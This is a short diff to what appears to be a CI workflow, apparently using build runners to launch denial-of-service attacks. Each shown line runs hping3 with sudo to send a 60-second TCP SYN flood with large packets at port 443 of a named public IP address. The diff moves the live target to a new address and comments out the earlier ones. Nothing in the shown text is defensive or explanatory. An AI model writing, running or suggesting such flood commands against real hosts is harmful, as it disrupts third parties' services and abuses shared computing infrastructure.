@@ -34,4 +34,5 @@ jobs:
           date "+%Y-%m-%d %H:%M:%S"
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.76.85.88 || true
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.243.69.11 || true
-          sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 106.14.219.131 || true
+          sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 139.224.71.209 || true
+          # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 106.14.219.131 || true
